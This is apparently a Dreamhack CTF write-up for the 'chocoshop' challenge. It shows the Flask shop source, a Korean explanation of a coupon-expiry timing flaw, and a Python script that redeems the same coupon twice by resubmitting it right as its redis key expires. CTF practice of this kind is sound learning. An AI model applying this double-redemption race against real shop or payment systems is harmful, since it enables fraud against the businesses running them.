## chocoshop
---

```python
from flask import Flask, request, jsonify, current_app, send_from_directory
import jwt
import redis
from datetime import timedelta
from time import time
from werkzeug.exceptions import default_exceptions, BadRequest, Unauthorized
from functools import wraps
from json import dumps, loads
from uuid import uuid4

r = redis.Redis()
app = Flask(__name__)

# SECRET CONSTANTS
# JWT_SECRET = 'JWT_KEY'
# FLAG = 'DH{FLAG_EXAMPLE}'
from secret import JWT_SECRET, FLAG

# PUBLIC CONSTANTS
COUPON_EXPIRATION_DELTA = 45
RATE_LIMIT_DELTA = 10
FLAG_PRICE = 2000
PEPERO_PRICE = 1500


def handle_errors(error):
    return jsonify({'status': 'error', 'message': str(error)}), error.code

 
for de in default_exceptions:
    app.register_error_handler(code_or_exception=de, f=handle_errors)


def get_session():
    def decorator(function):
        @wraps(function)
        def wrapper(*args, **kwargs):
            uuid = request.headers.get('Authorization', None)
            if uuid is None:
                raise BadRequest("Missing Authorization")

            data = r.get(f'SESSION:{uuid}')
            if data is None:
                raise Unauthorized("Unauthorized")

            kwargs['user'] = loads(data)
            return function(*args, **kwargs)
        return wrapper
    return decorator


@app.route('/flag/claim')
@get_session()
def flag_claim(user):
    if user['money'] < FLAG_PRICE:
        raise BadRequest('Not enough money')

    user['money'] -= FLAG_PRICE
    return jsonify({'status': 'success', 'message': FLAG})


@app.route('/pepero/claim')
@get_session()
def pepero_claim(user):
    if user['money'] < PEPERO_PRICE:
        raise BadRequest('Not enough money')

    user['money'] -= PEPERO_PRICE
    return jsonify({'status': 'success', 'message': 'lotteria~~~~!~!~!'})


@app.route('/coupon/submit')
@get_session()
def coupon_submit(user):
    coupon = request.headers.get('coupon', None)
    if coupon is None:
        raise BadRequest('Missing Coupon')

    try:
        coupon = jwt.decode(coupon, JWT_SECRET, algorithms='HS256')
    except:
        raise BadRequest('Invalid coupon')

    if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')

    rate_limit_key = f'RATELIMIT:{user["uuid"]}'
    if r.setnx(rate_limit_key, 1):
        r.expire(rate_limit_key, timedelta(seconds=RATE_LIMIT_DELTA))
    else:
        raise BadRequest(f"Rate limit reached!, You can submit the coupon once every {RATE_LIMIT_DELTA} seconds.")


    used_coupon = f'COUPON:{coupon["uuid"]}'
    if r.setnx(used_coupon, 1):
        # success, we don't need to keep it after expiration time
        if user['uuid'] != coupon['user']:
            raise Unauthorized('You cannot submit others\' coupon!')

        r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
        user['money'] += coupon['amount']
        r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
        return jsonify({'status': 'success'})
    else:
        # double claim, fail
        raise BadRequest('Your coupon is alredy submitted!')


@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'], 'amount': 1000, 'expiration': int(time()) + COUPON_EXPIRATION_DELTA}
    uuid = user['uuid']
    user['coupon_claimed'] = True
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(user))
    return jsonify({'coupon': coupon})


@app.route('/session')
def make_session():
    uuid = uuid4().hex
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(
        {'uuid': uuid, 'coupon_claimed': False, 'money': 0}))
    return jsonify({'session': uuid})


@app.route('/me')
@get_session()
def me(user):
    return jsonify(user)


@app.route('/')
def index():
    return current_app.send_static_file('index.html')

@app.route('/images/<path:path>')
def images(path):
    return send_from_directory('images', path)

```

<br><br>

## Solution
---

timing을 맞춰야 하는데 코드를 보면 쿠폰을 생성하면 만료 시간이 설정되고, 쿠폰을 제출하면 두 개의 키가 redis에 등록되는데 두 번째 키가 중요하다.

두 번째 키의 만료 시간을 보면 쿠폰의 만료 시간에서 현재 시간을 뺀다.

즉, 두 번째 키는 쿠폰이 만료되는 시점에 없어진다고 보면 되는데.. 

```coupon['expiration'] < int(time()): raise BadRequest('Coupon expired!')``` 이 부분을 생각해보자.

<br>

쿠폰을 만든 시점이 정확히 100초라 할 때, 쿠폰 만료 시점은 정확히 145초이고 키 또한 정확히 145초에 만료된다.

지금이 정확히 145초라고 치면 일단 키는 만료되었는데, ```int(time())```부분에서 만약 ```time()``` 값이 ```145.1 ~ 145.9```초 사이에 있다고 하자.

이 시점에선 어차피 int를 통해 145초가 되므로 ```145<145```가 조건문을 통과할 수 있으며, 이미 145초를 지난, ```145.1 ~ 145.9```초 사이에 있으므로 두 번째 키 또한 만료되었다.

따라서 돈을 천원 더 넣을 수 있게 되어 2000원이 되므로 플래그를 사면 플래그를 alert 해준다.

<br>

```python
import requests
import time
import json

url = 'http://host3.dreamhack.games:{port}/coupon/claim'
headers = {
    "Authorization": "{uuid}",
    "Content-Type": "application/json, application/x-www-form-urlencoded"
}

res = requests.get(url, headers=headers)
# coupon_expire_time = int(time.time()) + 44.2

'''
코드 상으로는 res가 받은 시점에서는 이미 쿠폰은 생성된지 조금이라도 시간이 지나있다.

이 부분을 유의해서 쿠폰 만료 시간을 계산한 것.
'''

coupon = json.loads(res.text)
headers["coupon"] = coupon["coupon"]

url = 'http://host3.dreamhack.games:21345/coupon/submit'
res = requests.get(url, headers=headers)

'''
while (1):
    print("wait...")
    if (int(time()) == coupon_expire_time):  ---> 이 걸로 하면 키가 만료 되기 전에 보내지므로 안됨.
        res = requests.get(url, headers=headers)
        print(res.text)
        break
'''

time.sleep(44.2) 
# 쿠폰이 만료될 시점을 고려해서 키는 없어졌지만 아직 쿠폰 만료 시간과 int(time) 값이 동일할 때 보내야 함
# 안되면 조금씩 내림조정해서 설정
res = requests.get(url, headers=headers)
print(res.text)
```
